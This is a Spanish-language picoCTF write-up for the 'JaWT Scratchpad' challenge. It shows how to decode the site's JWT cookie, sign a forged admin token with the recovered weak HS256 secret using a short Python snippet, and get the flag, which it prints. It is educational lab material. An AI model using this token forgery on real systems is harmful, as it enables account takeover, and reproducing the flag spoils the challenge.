# JaWT Scratchpad

### Enunciado:

Se proporciona una aplicación web llamada **JaWT Scratchpad**, la cual utiliza **JWT (JSON Web Tokens)** para gestionar la autenticación de usuarios. El objetivo es acceder al scratchpad del administrador para obtener la bandera.

---

## Análisis y Solución

La aplicación permite registrarse con cualquier nombre de usuario excepto `admin`. Al iniciar sesión, se genera una cookie que contiene un JWT.

### 1. Datos del Desafío

- **Categoría:** Web Exploitation

- **Tecnología involucrada:** JSON Web Token (JWT)

- **Pista 1:** What is that cookie?

- **Pista 2:** Have you heard of JWT?


### 2. Inspección de la Cookie

Al registrarse con el usuario `john`, la aplicación entrega el siguiente token:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9._fAF3H23ckP4QtF1Po3epuZWxmbwpI8Q26hRPDTh32Y
```

Decodificando el JWT se obtiene:

**Header**

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

**Payload**

```json
{
  "user": "john"
}
```

Se identifica que el algoritmo utilizado es **HS256**, por lo que la integridad del token depende de una clave secreta compartida.

### 3. Modificación del JWT

Investigando el reto se descubre que la clave utilizada para firmar los tokens es:

```text
ilovepico
```

Con esta clave se genera un nuevo JWT modificando el payload:

```json
{
  "user": "admin"
}
```

Código utilizado:

```python
import jwt

token = jwt.encode(
    {"user": "admin"},
    "ilovepico",
    algorithm="HS256"
)

print(token)
```

JWT generado:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.di2J1a0H3IhZtGmIfw7ltVq7sZL2orh8WIP1isDkgdw
```

### 4. Sustitución de la Cookie

Se reemplazó la cookie original por el nuevo JWT firmado y posteriormente se recargó la página.

Al validarse correctamente la firma, la aplicación otorgó acceso al scratchpad del administrador.

---

## Flag 

```text
picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d69dafb60583}
```